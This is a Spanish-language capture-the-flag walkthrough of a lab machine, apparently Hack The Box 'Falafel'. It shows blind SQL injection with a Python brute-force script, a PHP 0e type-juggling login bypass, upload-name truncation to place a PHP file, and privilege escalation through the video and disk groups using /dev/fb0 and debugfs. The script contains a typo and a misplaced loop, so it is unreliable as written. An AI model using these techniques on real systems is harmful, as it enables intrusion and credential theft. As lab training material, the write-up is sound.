--------
- Tags: #debugfs #information-leakage #sqli #python-scripting #type-juggling #file-upload #video-group #disk-group 
---------
## Técnicas utilizadas
- Information Leakage  
- SQL Injection (SQLI) - Abusing substring function  
- Obaining user passwords [Python Scripting]  
- PHP Type Juggling Exploitation (0e hash collision)  
- Abusing File Upload - File name truncation (Bordering the limits)  
- Abusing video group - Taking a screenshot to view a password [GIMP && Playing with virtual_size]  
- Abusing disk group to read the flag [debugfs] Privilege Escalation
## Procedimiento
![[Pasted image 20230817211747.png]]
#### Reconocimiento
Un escaneo con **nmap** nos muestra los siguientes puertos abiertos, con sus respectivos servicios y versiones:
```ruby
# nmap -p22,80 -sCV 10.10.10.73 -oN Ports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 20:03 PDT
Nmap scan report for 10.10.10.73
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
| http-robots.txt: 1 disallowed entry 
|_/*.txt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

Con **whatweb** podemos listar las tecnologías que estan corriendo por detrás del sitio web:
```ruby
# whatweb 10.10.10.73
http://10.10.10.73 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], Email[IT@falafel.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.73], Script, Title[Falafel Lovers]
```

---------------------
#### Information Leakage  
El escaneo de **nmap** nos reporta que hay un **robots.txt** el cual, al visitarlo, hace alución a que probablemente existan archivos **.txt** ya que referencia una **wildcard** acompañado de la extension antes mencionada:
![[Pasted image 20230823200635.png]]

Visitando la web, nos encontramos un mensaje de bienvenida que nos da una pequeña descripción de lo que es el sitio web:
![[Pasted image 20230823200652.png]]

En la esquina superior derecha, vemos un enlace que nos redirecciona a **Login**. A la par, podemos ir **Fuzzeando** por archivos con extensiones **.txt** dado que el **Robots.txt** nos dio esa pista:
```
# wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.10/FUZZ.txt
```

y encontramos lo siguiente:
![[Pasted image 20230823212215.png]]


Dentro, nos dicen que pudieron acceder a la cuenta de **Admin** sin proporcionar contraseña, lo cual, de primeras nos hace pensar en un **Bypassing**. Además, nos revelan otro usuario a nivel de web de nombre **Chris'**.

--------------
#### SQL Injection (SQLI) - Abusing substring function  
Jugando un rato con el **Login** vemos que es vunlerable a **SQLi** y podemos guiarnos de la respuesta del servidor para ir enumerando la base de datos. Cuando acertamos con el numero correcto de columnas, vemos que se nos muestra un mensaje que dice que las credenciales de **admin** son incorrectas:
![[Pasted image 20230823212335.png]]

Pero, al intentar usar un **union select**  para ir mostrando nuestro input en el output, vemos que nos lanza un aviso de intento de hackeo:
![[Pasted image 20230823212424.png]]

Podemos jugar con **Substr** para enumerar la contraseña del usuario administrador, de la siguiente manera:
```
admin' and substring(password,1,1)='caracter'
```

---------
#### Obaining user passwords [Python Scripting]  
Para no hacer esto manualmente, podemos crear un pequeño script en python para ir dumpeando los respectivos valores:
```python
#!/usr/bin/python3
from pwn import *
import requests
import time
import sys
import pdb
import signal
import string

# ctrl + c
def def_handler(sig,frame):
	print("\n[+] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.10/login.php"
characters = string.ascii_lowercase + string.digits
password = ""

# Funciones
def makeSQLI():

	p1 = log.progress("Inciando proceso de fuerza bruta")
	p1.status("Fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Contraseña")
	for position in range(1,50):
		for character in characters:
			post_data = {
				'username' : "admin' and subtring(password,%d,1)='%s'-- -" % (position,character),
				'password' : 'admin' 
			}
		r = requests.post(main_url, data=post_data)
		p1.status(post_data['username'])
		
		if "try agai" not in r.text:
			password += character
			p2.status(password)
			break

# Flujo del programa
if __name__ == "__main__":
	makeSQLI()
	

```

---------
#### PHP Type Juggling Exploitation (0e hash collision)  
Al final, podemos obtener la contraseña de Chris y de **Admin** las cuales, no estan en texto plano, sin embargo, podemos utilizar **CrackStation** para intentar crackearlas, pero, solo podemos obtener la de **Chris**:
![[Pasted image 20230823220207.png]]

La contraseña de **Chris** nos da un gran hint para poder entrar a la cuenta de **Admin**. Viendo el aspecto de la contraseña de **admin** es posible que sea vulnerable a **0e** collision, dado que, esta cumple con toda la estetica. hay un [articulo](https://news.ycombinator.com/item?id=9484757) que lo explica mejor. Intentaremos con la contraseña `aabg7XSs` la cual, al hacerlo, hara un comparativa con la contraseña verdadera, pero como ambas son **0** elevado a las potencias correspondientes, daran **0** asi que nos podremos loguear de forma correcta:
![[Pasted image 20230823220318.png]]

-----------
#### Abusing File Upload - File name truncation (Bordering the limits)
Al entrar como admin, vemos que nos deja subir un archivo desde nuestra maquina. Cuando lo hacemos, nos muestra a nivel de **Output** los comandos ejecutados y por ahi podemos ver un **wget**:
![[Pasted image 20230823220426.png]]

Uno podria pensar de primeras en un **Command Injection**, sin embargo, no vamos poder llegar a eso de primeras, dado que esta más o menos sanitizado. Otra cosa que podriamos intentar es un **File name truncation**, para acontecer esto, primero tendriamos que crear un archivo lo suficientemente grande (255 bytes en linux) por ejemplo `AAAAAAAAAAAAA[...].jpg` y al intentar subirlo vemos el siguiente ouput, que nos indica que el archivo es demasiado grande y que por lo tanto lo va acotar:
```json
<pre>CMD: cd /var/www/html/uploads/0824-0805_5c434c013d1a847f; wget 'http://10.10.14.5/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jpg'</pre>
<pre>The name is too long, 255 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
--2023-08-24 08:05:31-- http://10.10.14.5/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jpg
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 404 File not found
2023-08-24 08:05:31 ERROR 404: File not found.
```

Bien, podemos aprovecharnos de los ultimos caracteres para en vez de subir un **.jpg** subir un **.php** (de primeras no se puede subir PHP). Vamos hacer eso de una tool de **Metasploit** que se encuentra en la ruta `/opt/metasploit/tools/exploit/pattern_create` para crear un patron de un numero determinado de caracteres:
```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 251
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai
```

Lo subimos a la pagina, y ahora, vamos a tomar los ultimos cuatro bytes de la respuesta del sevidor para ver la cantidad de traya que se necesita (offset) para llegar ahi:
```
Image Repsonse Server
```

Y ahora, con este comando calculamos el numero total:
```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q i2Ai
[*] Exact match at offset 247
```

Con esto, crearemos un archivo de ejemplo para intentar subir, tomaremos el total del offset y le concateramos un nombre un extension:
```
# python3 -c 'print("A"*232 + "test.jpg")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.jpg

# touch
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.jpg
```

Y vemos en la web que exactamente ha cortado el **.jpg**:
```
Image Web Response
```

Bueno, nos aprovecharemos de esto de esta forma, como vemos que test es la parte que deja, vamos a borrarlo y donde antes decia test, vamos a colocar **.PHP** asi, a la hora de subirlo, nos va a cortar el **.JPG** y nos dejara la extension **.PHP**:
```
Image Truncation.php
```

En el mismo outout viene, además la ruta donde se ha subido el archhivo, asi que podemos atentar contra este para ejecutar comandos de manera remota o entablarnos una reverse shell.


--------------
#### Abusing video group - Taking a screenshot to view a password [GIMP && Playing with virtual_size]  
En un archivo de nombre **Connection.php** que se encuentra en la carpeta de la web, podemos ver unas credenciales que nos sirve para migrar al usuario **Moshe**. Este usuario, pertenece al grupo **Video** el cual, nos permite algunas veces tomar screenshot. Podemos buscar por archivos que pertenezca a este grupo y vemos lo siguiente:
```
# find / -group video 2>/dev/null
```

El archivo que nos interesa, en esta caso, es el de nombre **fb0**. A este mismo le vamos hacer un **cat** y exportaremos el output a un archivo, ya que este, sera un screenshot que inspeccionaremos en nuestra maquina. En la maquina victima buscaremos por archivos **fb0** para intentar dar con el **Virtual Size**:
```
# find / -name fb0 2>/dev/null
/dev/fb0
/dev/dri/card0
/dev/dri/renderD128
/dev/dri/controlD64
```

El que nos interesa en este caso es el primero, el cual, si le hacemos un `ls -l` podemos ver dentro de el un archivo con nombre **virtual_size** que tiene dentro las proporciones adecuadas para visualizar correctamente la captura de pantalla:
```ruby
# cat /sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size
1176,885
```

Ahora, nos abriremos la herramienta de nombre **gimp** y dentro buscaremos el **fb0** despues le daremos a **Select File Type** y seleccionaremos **Raw Image Data** y con esto le daremos a **Open**:
![[Pasted image 20230823223200.png]]

Al darle click a **Open** vemos que se nos abrira una ventana donde vamos espeficiar los valores encontrados anteriormente en **Virtual Size**:
![[Pasted image 20230823223217.png]]

Y en **Image Type** lo cambiaremos a **Big Endian**, con esto, podremos visualizar la imagen de forma más clara:
![[Pasted image 20230823223316.png]]

Con las credenciales detectadas, podemos migrar al siguiente usuario

----------
#### Abusing disk group to read the flag [debugfs] Privilege Escalation
Si vemos los grupos a los que pertenecemos, vemos que tenemos asignado el grupo **Disk**, si buscamos por archivos que pertenezcan a este grupo vemos los siguientes:
```
# find / -group disk 2>/dev/null
/dev/btrfs-control
/dev/sda5
/dev/sda2
/dev/sda1
/dev/sg0
/dev/sda
/dev/loop7
/dev/loop6
/dev/loop5
/dev/loop4
/dev/loop3
/dev/loop2
/dev/loop1
/dev/loop0
/dev/loop-control
```

Vemos que esta el archivo **/dev/sda1**. Esto tambien lo podriamos a ver visto si hacemos un `fdisk -l`, como pertenecemos al grupo **Disk** podriamos intentar listar todo el contenido de **sda1** ya que parece ser el mismo sistema, pero como lo vemos de manera privilegiada, podriamos sacar cosas interesantes. Vamos a utilizar la herramient **debugfs**:
```
# debugfs /dev/sda1
```

Y ahora podemos leer la root.txt
```
Flag
```
